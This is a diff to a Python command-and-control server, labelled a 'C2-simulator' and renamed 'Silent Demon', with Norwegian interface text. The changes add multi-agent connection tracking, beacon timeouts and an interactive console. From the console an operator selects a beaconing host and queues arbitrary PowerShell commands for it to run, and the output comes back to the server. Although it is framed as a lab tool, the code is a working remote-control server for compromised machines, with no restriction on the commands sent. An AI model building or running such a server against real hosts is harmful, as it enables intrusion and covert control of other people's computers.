@@ -13,20 +13,31 @@ import uuid
 from datetime import datetime, timezone
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
-import re
+import time
+from prompt_toolkit import prompt
+from prompt_toolkit.patch_stdout import patch_stdout
+from prompt_toolkit.completion import WordCompleter, NestedCompleter, DynamicCompleter
+from prompt_toolkit.history import FileHistory
+from prompt_toolkit import PromptSession
 
 HOST = os.getenv("COLLECTOR_BIND", "0.0.0.0")
 PORT = int(os.getenv("COLLECTOR_PORT", "5050"))
 LOG = Path(__file__).resolve().parent / "collector_events.jsonl"
+LAB_BEACON_INTERVAL = int(os.getenv("LAB_BEACON_INTERVAL", "1"))  # sekunder mellom forventede beacons
 pending = queue.Queue()
-# CMD_OUTPUT_PATTERN = re.compile(r".*?>(.*)", re.DOTALL)
-
+# ww = False
 
 def now():
     return datetime.now(timezone.utc).isoformat()
 
-
+def currConnIds(server) -> dict:
+        for_nested_comp = []
+        for x, conn_id, y in server.connections:
+            for_nested_comp.append(str(conn_id))
+        return {k: None for k in for_nested_comp}
+    
 class Handler(BaseHTTPRequestHandler):
+    
     def do_POST(self):
         if self.path != "/checkin":
             self.send_error(404)
@@ -53,12 +64,24 @@ class Handler(BaseHTTPRequestHandler):
             "host_label": data.get("host_label"),
             "event": data.get("event"),
             "last_result": result,
+            "connection_id": data.get("connection_id"),
+            "monotonic_time": time.monotonic()
         }
+        
+        key_conn = (record["host_label"], record['connection_id'], record['source_address'])
+        if key_conn not in self.server.connections:
+            print(f"!!!!", flush=True)
+            print(f"[NY TILKOBLING] {record['host_label']} fra {record['source_address']} med monotonic_time {record['monotonic_time']}", flush=True)
+            print(f"!!!!", flush=True)
+            self.server.connections.append(key_conn)
+            self.server.conn_ids = currConnIds(self.server)
+            
+        self.server.connections_beacon_times[key_conn] = time.monotonic()
 
         with LOG.open("a", encoding="utf-8") as f:
             f.write(json.dumps(record, ensure_ascii=False) + "\n")
         if result is not None:
-            print("\n[RESULTAT]", flush=True)
+            print("[RESULTAT]", flush=True)
             for key, value in result.items():
                 if key == "output":
                     # match = CMD_OUTPUT_PATTERN.match(value)
@@ -66,10 +89,22 @@ class Handler(BaseHTTPRequestHandler):
                     #     value = match.group(1)
                     # else:
                     #     value = "<ingen output>"
-                    print(f"\n-------------\n{value}", flush=True)
+                    print(f"-------------\n{value}", flush=True)
+                    if value == "dead_typeshi":
+                        print(f"[DEAD] {record['host_label']} fra {record['source_address']}", flush=True)
+                        if self.server.selected_connection == key_conn:
+                            self.server.selected_connection = None
+                            
+                        self.server.connections = [c for c in self.server.connections if c != key_conn]
+                        self.server.conn_ids = currConnIds(self.server)
+                        if key_conn in self.server.connections_beacon_times:
+                            del self.server.connections_beacon_times[key_conn]
                     continue
 
                 print(f"  {key}: {value}", flush=True)
+            
+            with threading.Lock():
+                self.server.ww = False
         # else:
         #     print(f"\n[BEACON] {record['host_label']} fra {record['source_address']}", flush=True)
 
@@ -92,21 +127,133 @@ class Handler(BaseHTTPRequestHandler):
 
 if __name__ == "__main__":
     server = ThreadingHTTPServer((HOST, PORT), Handler)
+    server.connections = []
+    server.connections_beacon_times = {}
+    server.ww = False
     threading.Thread(target=server.serve_forever, daemon=True).start()
-    print(f"VaffelOps C2-simulator lytter på {HOST}:{PORT}")
+    print(f"Silent Demon C2-simulator lytter på {HOST}:{PORT}")
     print(f"Hendelseslogg: {LOG}")
-    print("Skriv en handling og trykk Enter. Skriv 'exit' for å avslutte.\n")
-    try:
+    timeout = LAB_BEACON_INTERVAL * 5
+    def help():
+        print("USAGE:")
+        print("\thelp_typeshi                       - vis denne hjelpeteksten")
+        print("\texit_typeshi / quit_typeshi        - avslutt programmet")
+        print("\tclear_typeshi                      - tøm skjermen (clear console)")
+        print(f"\ttimeout_typeshi <sekunder>        - sett tidsavbrudd for beacon-sjekk (nå {timeout})")
+        print("\tconn_typeshi                       - list tilgjengelige tilkoblinger")
+        print("\tconn_typeshi <connection_id>       - velg tilkobling")
+        print("\t(conn mode) backup_typeshi         - stopp å snakke med valgt tilkobling")
+        print("\t(conn mode) exit                   - frakoble valgt tilkobling")
+        print("\t(conn mode) <handling>             - send handling til valgt tilkobling (powershell command)")
+        print("\t                                     !! Kun ikke interaktive handlinger støttes !!")
+        print("Conn mode betyr at du må ha valgt en tilkobling før du kan bruke handlingene.")
+    help()
+    session = PromptSession(history=FileHistory(".silent_demon_history"), enable_history_search=True)
+    
+    
+    
+      
+    def beacon_timout_checker(server):
+        global timeout
+        import time
         while True:
-            action = input("lab-action> ").strip()
-            if action.upper() in {"EXIT", "QUIT"}:
-                break
-            if action != "":
-                command = {"action": action, "command_id": uuid.uuid4().hex[:8]}
-                pending.put(command)
-                print(f"[KØ] {action} – sendes ved neste beacon")
-            # elif action:
-            #     print("Ukjent handling. Tillatt:", ", ".join(sorted(ALLOWED_ACTIONS)))
+            now_time = time.monotonic()
+            to_remove = []
+            for key, last_beacon in server.connections_beacon_times.items():
+                if now_time - last_beacon > timeout:
+                    print(f"[TILKOBLING TIMET UT] {key[0]} fra {key[2]} med siste monotonic_time {server.connections_beacon_times[key]}", flush=True)
+                    to_remove.append(key)
+            for key in to_remove:
+                server.connections_beacon_times.pop(key, None)
+                server.connections = [c for c in server.connections if c != key]
+                server.conn_ids = currConnIds(server)
+                server.selected_connection = None
+            time.sleep(timeout)
+    threading.Thread(target=beacon_timout_checker, args=(server,), daemon=True).start()
+    
+    server.conn_ids = currConnIds(server)
+    
+    def get_comp():
+        return NestedCompleter.from_nested_dict({
+            "help_typeshi": None,
+            "exit_typeshi": None,
+            "quit_typeshi": None,
+            "clear_typeshi": None,
+            "timeout_typeshi": None,
+            "conn_typeshi": {
+                id: None for id in server.conn_ids
+            },
+            "backup_typeshi": None
+        })
+        
+    action_completer = DynamicCompleter(get_comp)
+
+    server.selected_connection = None
+    try:
+        with patch_stdout():
+            while True:
+                while server.ww:
+                    time.sleep(0.1)
+
+                action = session.prompt(f"lab-action ({server.selected_connection if server.selected_connection else 'ingen tilkobling'})>", completer=action_completer, complete_while_typing=True, enable_history_search=True).strip()
+                
+            
+                if action.lower() in {"exit_typeshi", "quit_typeshi"}:
+                    break
+                if action.lower() == "help_typeshi":
+                    help()
+                    continue
+                if action.lower().startswith("timeout_typeshi"):
+                    parts = action.split()
+                    if len(parts) == 2 and parts[1].isdigit():
+                        timeout = int(parts[1])
+                        print(f"Tidsavbrudd for beacon-sjekk satt til {timeout} sekunder.")
+                    else:
+                        print(f"Bruk (timeout nå {timeout}): timeout_typeshi <sekunder>")
+                    
+                    continue
+                
+                if action.lower() == "clear_typeshi":
+                    import os
+                    os.system("cls" if os.name == "nt" else "clear")
+                    continue
+            
+                if action != "" and server.selected_connection:
+                    if action.lower() == "backup_typeshi":
+                        server.selected_connection = None
+                        print("stoppet å snakke med valgt tilkobling")
+                        continue
+                    elif action.lower() == "exit":
+                        print("Tilkoblingen frakobles straks vent til agenten sender neste beacon.")
+                        
+                    command = {"action": action, "command_id": uuid.uuid4().hex[:8]}
+                    pending.put(command)
+                    print(f"[KØ] {action} – sendes ved neste beacon")
+                    server.ww = True
+                elif action and not server.selected_connection:
+                    if server.connections and action.startswith("conn_typeshi"):
+                        parts = action.split()
+                        if len(parts) == 1:
+                            print("Tilkoblinger typeshi:")
+                            fmt = "{:<8}  {:<15}  {}"
+                            print(fmt.format("ID", "SOURCE", "HOST"))
+                            for host_label, conn_id, src_addr in server.connections:
+                                print(fmt.format(conn_id, src_addr, host_label))
+                        elif len(parts) == 2:
+                            conn_id = parts[1]
+                            for host_label, cid, src_addr in server.connections:
+                                if cid == conn_id:
+                                    server.selected_connection = (host_label, cid, src_addr)
+                                    print(f"Valgt tilkobling: {cid} fra {src_addr} ({host_label})")
+                                    break
+                            else:
+                                print(f"Ingen tilkobling med ID {conn_id} funnet.")
+                        continue
+                    print("Ingen tilkobling tilgjengelig for å sende handlingen.")
+                    print("For å koble på må du først vente på at en agent sender beacon (tilkoblingsforespørsel).")
+                    print("deretter kan du skrive \"conn_typeshi\" for å se tilgjengelige tilkoblinger." )
+                    print("Når du ser tilgjengelige tilkoblinger, kan du velge en ved å skrive \"conn_typeshi <connection_id>\".")
+            
     except (KeyboardInterrupt, EOFError):
         pass
     finally:
